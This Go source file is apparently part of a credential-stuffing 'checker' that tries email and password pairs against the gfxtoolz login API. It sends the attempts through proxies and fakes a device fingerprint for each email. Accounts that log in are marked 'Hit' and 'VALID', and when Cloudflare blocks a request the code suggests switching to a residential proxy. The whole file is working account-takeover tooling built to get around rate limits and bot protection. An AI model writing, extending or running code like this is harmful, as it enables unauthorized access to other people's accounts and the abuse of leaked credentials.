package main

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"net/http"
	"net/url"
	"strings"
)

func (c *Checker) checkGfxtoolz(email, password string, proxyURL *url.URL) CheckResult {
	result := CheckResult{Email: email, Password: password}

	client, err := c.freshClient(proxyURL)
	if err != nil {
		result.Status = StatusError
		result.Reason = err.Error()
		return result
	}
	defer clearHTTPClientSession(client, c.cfg.BaseURL(), "https://app.gfxtoolz.ai", "https://api.gfxtoolz.ai")

	loginURL := c.cfg.Var("login_api_url", "https://api.gfxtoolz.ai/api/v1/auth/login")
	signinURL := c.cfg.Var("signin_url", "https://app.gfxtoolz.ai/signin")
	fp := gfxtoolzDeviceFingerprint(email)

	postBody := fmt.Sprintf(
		`{"email":%s,"password":%s,"deviceFingerprint":%s}`,
		jsonString(email),
		jsonString(password),
		jsonString(fp),
	)

	respBody, status, _, err := c.doRequest(client, http.MethodPost, loginURL, map[string]string{
		"Accept":               "application/json, text/plain, */*",
		"Accept-Language":      "en-US,en;q=0.9",
		"Cache-Control":        "no-cache, no-store",
		"Content-Type":         "application/json",
		"Origin":               "https://app.gfxtoolz.ai",
		"Pragma":               "no-cache",
		"Referer":              signinURL,
		"User-Agent":           c.cfg.UserAgent,
		"x-device-fingerprint": fp,
	}, postBody)
	if err != nil {
		st, reason := c.resultFromRequestErr("login POST", err)
		result.Status = st
		result.Reason = reason
		return result
	}

	switch {
	case isRateLimitedStatus(status):
		result.Status = StatusRateLimited
		result.Reason = rateLimitReason(fmt.Sprintf("login HTTP %d", status))
		return result
	case status == http.StatusUnauthorized:
		result.Status = StatusFail
		result.Reason = parseGfxtoolzLoginFail(respBody)
		return result
	case status == http.StatusForbidden:
		result.Status = StatusError
		result.Reason = gfxtoolzForbiddenReason(respBody)
		return result
	case status == http.StatusBadRequest:
		result.Status = StatusFail
		if reason := parseGfxtoolzLoginFail(respBody); reason != "" && !strings.Contains(strings.ToLower(reason), "device fingerprint") {
			result.Reason = reason
		} else {
			result.Status = StatusError
			result.Reason = parseGfxtoolzLoginFail(respBody)
		}
		return result
	case gfxtoolzLoginSucceeded(status, respBody):
		result.AccountEmail = email
		if userEmail, ok := jsonPathString(respBody, "user.email"); ok && userEmail != "" {
			result.AccountEmail = userEmail
		}
		result.PlanName = "Logged In"
		result.PlanLabel = "VALID"
		result.Status = StatusHit
		return result
	default:
		result.Status = StatusError
		result.Reason = fmt.Sprintf("unexpected login HTTP %d: %s", status, truncateForReason(respBody, 160))
		return result
	}
}

func gfxtoolzDeviceFingerprint(email string) string {
	sum := sha256.Sum256([]byte("gfxtoolz-checker-v1:" + strings.ToLower(strings.TrimSpace(email))))
	return hex.EncodeToString(sum[:])
}

func gfxtoolzLoginSucceeded(status int, body string) bool {
	if status != http.StatusOK && status != http.StatusCreated {
		return false
	}
	for _, path := range []string{"accessToken", "data.accessToken"} {
		if token, ok := jsonPathString(body, path); ok && token != "" {
			return true
		}
	}
	return false
}

func parseGfxtoolzLoginFail(body string) string {
	if code, ok := jsonPathString(body, "code"); ok && code == "INVALID_CREDENTIALS" {
		if msg, ok := jsonPathString(body, "message"); ok && msg != "" {
			return msg
		}
		return "Invalid email or password"
	}
	if msg, ok := jsonPathString(body, "message"); ok && msg != "" {
		return msg
	}
	if code, ok := jsonPathString(body, "code"); ok && code != "" {
		return code
	}
	return "login failed"
}

func gfxtoolzForbiddenReason(body string) string {
	lower := strings.ToLower(body)
	if strings.Contains(lower, "cloudflare") || strings.Contains(lower, "cf-") {
		return "Cloudflare blocked API — try residential proxy"
	}
	return fmt.Sprintf("login HTTP 403: %s", truncateForReason(body, 120))
}

func truncateForReason(s string, max int) string {
	s = strings.TrimSpace(s)
	if len(s) <= max {
		return s
	}
	return s[:max] + "..."
}
